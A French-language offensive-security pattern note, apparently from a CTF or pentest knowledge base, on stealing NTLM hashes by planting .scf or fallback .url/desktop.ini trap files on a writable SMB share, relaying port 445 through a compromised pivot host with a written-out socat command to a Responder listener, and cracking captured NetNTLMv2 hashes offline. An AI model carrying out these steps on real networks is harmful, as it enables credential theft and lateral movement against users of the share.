---
doc_kind: pattern
title: "Relais socat pour Responder depuis un hote pivot + fallback .url si .scf est supprime"
category: misc
slug: fullhouse-ntlm-theft-smb-share-trap
created: 2026-10-29
status: active
tags:
  - ntlm-theft
  - responder
  - smb-write-share
  - socat-relay
  - icon-trap
chain_summary: "Quand Responder doit ecouter depuis un segment reseau non directement accessible, relayer via socat depuis un hote pivot deja compromis; si le piege .scf classique est automatiquement supprime par l'environnement, basculer vers un piege .url+desktop.ini."
---
# Relais socat pour Responder depuis un hote pivot + fallback .url si .scf est supprime

## Chain Summary

- One-line chain: Quand Responder doit ecouter depuis un segment reseau non directement accessible, relayer via socat depuis un hote pivot deja compromis; si le piege .scf classique est automatiquement supprime par l'environnement, basculer vers un piege .url+desktop.ini.
- Typical target shape: Acces en ecriture a un partage SMB consulte par d'autres utilisateurs; Responder ne peut pas ecouter directement sur le segment reseau pertinent (necessite un pivot); l'environnement supprime automatiquement les fichiers .scf.

## Preconditions

- Acces en ecriture a un partage SMB consulte par d'autres utilisateurs; Responder ne peut pas ecouter directement sur le segment reseau pertinent (necessite un pivot); l'environnement supprime automatiquement les fichiers .scf.

## Cheap Probes

- Tester le depot d'un fichier .scf piege et verifier s'il est supprime automatiquement apres un court delai.

## Telltale Evidence

- Le fichier .scf disparait rapidement du partage sans intervention, signalant une protection active.

## Escalation Order

1. Confirmer l'acces WRITE sur un partage SMB cible.
2. Deposer un piege .scf test; si supprime automatiquement, basculer vers .url+desktop.ini.
3. Depuis l'hote pivot ayant acces au segment pertinent, relayer le port 445 via socat vers l'hote ou tourne Responder.
4. Attendre la capture d'un hash NetNTLMv2 et le cracker offline.

## Common Mistakes

- Abandonner le vol NTLM via partage apres l'echec d'un seul type de piege (.scf) sans essayer les variantes equivalentes (.url, .lnk).

## Payload Shapes

```text
socat TCP4-LISTEN:445,fork,reuseaddr TCP4:<responder-host>:445  (depuis l'hote pivot)
```

## Related Writeups

- fullhouse-ntlm-theft-smb-share-trap

## Skill Impact

- Related skill: pwn-triage/AD: ajouter le fallback .url+desktop.ini et le relais socat Responder comme techniques de secours pour le vol NTLM via partage SMB.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
